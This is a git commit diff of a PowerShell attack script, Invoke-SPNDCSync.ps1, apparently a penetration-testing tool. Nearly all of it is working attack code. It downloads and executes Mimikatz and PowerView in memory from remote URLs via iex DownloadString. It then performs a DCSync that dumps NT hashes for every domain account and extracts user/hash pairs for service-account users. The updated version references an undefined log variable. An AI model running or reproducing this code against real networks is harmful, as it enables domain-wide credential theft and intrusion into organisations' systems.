eceadc871ba36fdee6c7fba1a481455e4a2b484b
LRVT <21357789+l4rm4nd@users.noreply.github.com>
2022-02-16 14:22:36 +0100

    Update Invoke-SPNDCSync.ps1

--- Invoke-SPNDCSync.ps1
+++ Invoke-SPNDCSync.ps1
@@ -1,53 +1,71 @@
-# CHECK WRITE PERMISSIONS ON CURRENT DIR
-Try { [io.file]::OpenWrite('justatestfile.txt').close() }
-Catch { Write-Warning "Unable to write to output file. Please change directory!"; break}
+# Author: LRVT - https://github.com/l4rm4nd/
 
-# LOAD POWERVIEW INTO MEMORY
-iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1');Get-NetDomain;
+# variables
+$DATE = $(get-date -f yyyyMMddThhmm)
+$PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
+$EXT = ".txt"
+$LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full" + $EXT
+$SPNLOG = $PATH + $DATE + "_" + "spnuser_fulldetails" + $EXT
+$SPNUSERS = $PATH + $DATE + "_" + "spnuser_samaccountname" + $EXT
+$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes" + $EXT
+$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users" + $EXT
+$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import" + $EXT
 
-# LOAD MIMIKATZ INTO MEMORY
+# download mimikatz into memory
+Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/nishang/master/Gather/Invoke-Mimikatz.ps1')
 
-# GET SPN SAMACCOUTNAMES ONLY & LOG RESULTS
-Get-DomainUser -SPN > spnuser_fulldetails.txt
-Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname } > spnuser_samaccountname.txt
+# download poweview into memory
+Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
+iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')
 
-# DO FULL DCSYNC OVER FULL DOMAIN & LOG RESULTS
-$DATE = $(get-date -f yyyyMMddThhmm)
-$LOG = $DATE + "_" + "DCSync_NTLM_full.txt"
-$LOGSPN = $DATE + "_" + "DCSYNC_SPN_NTHASH.txt"
-$LOGFIN = $DATE + "_" + "DCSync_NTLM_UserHash_FINAL.txt"
-$DOMAIN = get-netdomain | Select-Object -property Name | foreach { $_.Name}
+# print out domain context
+$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
+Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red
 
-write-host "[!!!] DCSync will be executed on" $DOMAIN -ForegroundColor Red
+$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
+if ($confirmation -eq 'y') {
 
-$command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $DOMAIN +' /all /csv"'
-Invoke-Mimikatz -Command $command
+    # create directory for storage
+    Write-Host ""
+    Write-Host "[INFO] Creating new directory at $PATH" -ForegroundColor Gray
+    New-Item -ItemType Directory -Force -Path $PATH | Out-Null
 
-# GET SPN USERS ONLY AS LOOP VAR
-$loop = Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname }
+    # enumerate user accounts with service principal name (SPN)
+    Write-Host "[INFO] Enumerating user accounts with set SPN" -ForegroundColor Gray
+    Get-DomainUser -SPN > $SPNLOG
+    $loop = Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname }
+    $loop > $SPNUSERS
 
-# LOOP OVER DCSYNC FULL AND FILTER FOR SPN USER & LOG RESULTS
-foreach ($spn in $loop) {
-get-content $LOG -ReadCount 1000 |
-    foreach { $_ -match $spn } >> $LOGSPN
+    # execute DCSync over the whole domain
+    Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
+    $command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $DOMAIN +' /all /csv"'
+    Invoke-Mimikatz -Command $command
+
+    # loop over DCSync log file and filter for SPN user accounts
+    Write-Host "[!] Extracting SPN users from DCSync logfile" -ForegroundColor Yellow
+    foreach ($spn in $loop) {
+    get-content $LOG -ReadCount 1000 |
+        foreach { $_ -match $spn } >> $LOGSPN
+    }
+
+    # GET NT-HASHES ONLY
+    Write-Host "[~] Extracting NT-Hashes from logfile" -ForegroundColor Yellow
+    (Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
+
+    # GET USERS ONLY
+    Write-Host "[~] Extracting users from logfile" -ForegroundColor Yellow
+    (Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
+
+    # CONCAT USER AND NT-HASH INTO OUTFILE
+    Write-Host "[~] Create user/hash merge file" -ForegroundColor Yellow
+    $File1 = Get-Content $USERS
+    $File2 = Get-Content $HASHES
+    for($i = 0; $i -lt $File1.Count; $i++)
+    {
+        ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $IMPORTFILE
+    }
+
+}else{
+    Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script (line 21)." -ForegroundColor Red
 }
-
-# GET NT-HASHES ONLY
-$HASHES = $DATE + "_" + "SPN_Hashes_Only_FINAL.txt"
-(Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
-
-# GET USERS ONLY
-$USERS = $DATE + "_" + "SPN_Users_Only_FINAL.txt"
-(Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
-
-# CONCAT USER AND NT-HASH INTO OUTFILE
-$File1 = Get-Content $USERS
-$File2 = Get-Content $HASHES
-for($i = 0; $i -lt $File1.Count; $i++)
-{
-    ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $LOGFIN
-}
-
-# VERIFY AMOUNT OF SPN AND DSYNCED SPNS
-write-host "Found SPNs:" (Get-Content "spnuser_samaccountname.txt" | Select-Object -property samaccountname | foreach { $_.samaccountname }).Length "(minus 1 for Guest account)" -ForegroundColor Red; write-host "DCsynced SPNs:" (Get-Content $LOGSPN).Length -ForegroundColor Red
